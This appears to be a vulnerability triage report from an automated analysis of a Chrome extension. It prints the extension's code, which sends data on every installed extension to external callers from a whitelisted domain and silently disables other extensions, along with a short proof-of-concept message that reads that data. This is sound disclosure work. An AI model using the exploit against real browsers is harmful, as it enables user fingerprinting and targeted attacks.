# CoCo Analysis: egdjlajabpmjcokbpadibkcchopdaofn

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 9 (all sendResponseExternal_sink)

---

## Sink 1-9: management_getAll_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/egdjlajabpmjcokbpadibkcchopdaofn/opgen_generated_files/bg.js
Line 921: var ExtensionInfos = [{"description": "description", "enabled": true}];
Line 1000-1008: chrome.management.getAll() → sendResponse with extension data

**Code:**

```javascript
// Background script - External message handler (bg.js)
chrome.runtime.onMessageExternal.addListener((a, r, n) => {
    if (a === "checked-website") {
        chrome.management.getAll((i) => {
            i.forEach((t) => {
                t.installType == "development" &&
                    t.enabled &&
                    chrome.management.setEnabled(t.id, !1),
                    t.id === "bookcfenenijcoedjlpfknknlgfimopp" &&
                        t.enabled &&
                        chrome.management.setEnabled(t.id, !1);
            });
        }),
            n({ message: "checked-website", status: !0 });
        return;
    }

    // Information disclosure vulnerability
    if (a === "website") {
        chrome.management.getAll((i) => {
            let t = i;  // Store all extension information
            i.forEach((o) => {
                o.installType == "development" &&
                    o.enabled &&
                    chrome.management.setEnabled(o.id, !1),
                    o.id === "bookcfenenijcoedjlpfknknlgfimopp" &&
                        o.enabled &&
                        chrome.management.setEnabled(o.id, !1);
            }),
                n({ status: !0, data: t });  // <- Send ALL extension info to external caller
        });
        return;
    }

    a === "verified" &&
        chrome.storage.sync.get("verified", function (i) {
            i.verified == null
                ? n({ message: "verified", text: "not-verified", status: !1 })
                : n({ message: "verified", text: i.verified, status: !0 });
        });

    const { text: l, msg: e } = a;
    e === "verified-website" &&
        chrome.storage.sync.set({ verified: l }, function () {
            n({ message: "verified-website", text: l, status: !0 });
        });
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message from whitelisted domain (poly.edu.vn)

**Attack:**

```javascript
// Malicious webpage on poly.edu.vn subdomain sends external message
chrome.runtime.sendMessage(
  "egdjlajabpmjcokbpadibkcchopdaofn",  // Target extension ID
  "website",  // Message type
  function(response) {
    // response.data contains information about ALL installed extensions:
    // - Extension IDs
    // - Extension names
    // - Extension descriptions
    // - Installation types
    // - Enabled/disabled status
    // - Version information
    // etc.
    console.log("Installed extensions:", response.data);
  }
);
```

**Impact:** Information disclosure vulnerability. While the manifest restricts external messages to poly.edu.vn domain, according to the methodology, even if only ONE domain can exploit it, this is a TRUE POSITIVE. An attacker who:
1. Compromises a poly.edu.vn subdomain, OR
2. Finds XSS on poly.edu.vn, OR
3. Controls any poly.edu.vn page

Can enumerate all installed extensions on the victim's browser. This information enables:
- Fingerprinting users based on their installed extensions
- Identifying potential attack vectors by discovering which extensions are installed
- Privacy violation by revealing user's extension preferences
- Targeted attacks against specific extensions known to be installed

The extension leaks sensitive browser extension information (IDs, names, versions, enabled status) to any external caller from the whitelisted domain, making this a clear information disclosure vulnerability.
